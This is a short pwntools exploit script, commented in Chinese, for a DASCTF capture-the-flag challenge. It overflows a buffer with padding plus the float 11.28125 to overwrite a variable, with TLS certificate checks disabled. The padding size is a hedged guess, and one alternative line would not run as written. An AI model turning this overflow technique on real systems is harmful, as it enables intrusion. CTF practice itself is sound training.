from pwn import *
import ssl

# 手动创建一个 SSL 上下文，并关闭证书验证
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

host = "afef57fa820a8e1c1eb38f4a.tcp-ctf2.dasctf.com"
port = 9999

print(f"[*] 正在连接 {host}:{port}...")
p = remote(host, port, ssl=True, ssl_context=ssl_context, sni=host)

# 1. 计算 11.28125 的浮点数内存表示
# 我们直接利用 struct 把 11.28125 打包成小端序的 4 字节
target_float = 11.28125
float_bytes = struct.pack("<f", target_float) 
# 但是在 64 位系统里，局部变量通常占 8 字节，所以我们需要把它填充到 8 字节
# 或者直接用 p64 将浮点数转化为十六进制地址
# （注意：有时题目是 32 位系统，那就用 p32）

# 2. 构造 Payload
# 根据你的计算：56 字节的垃圾数据 + 浮点数对应的二进制
# 这里假设它是 64 位系统，变量可能占 4 字节或 8 字节
# 如果不行，尝试把 p32 改成 p64，或者手动补齐 \x00
payload = b'A' * 44 + float_bytes + b'\x00'
# 或者 payload = b'A' * 56 + p32(11.28125) 
# 发送攻击
p.sendline(payload)

result = p.recvall(timeout=10).decode('utf-8', errors='ignore')

# 用正则提取真正的 Flag
import re
flags = re.findall(r"CTF2\{[^}]+\}", result)
if flags:
    print(f"\n\n[🎉] GOT THE FLAG: {flags[0]}\n\n")
else:
    print("[-] Flag not found, here is the raw output:")
    print(result)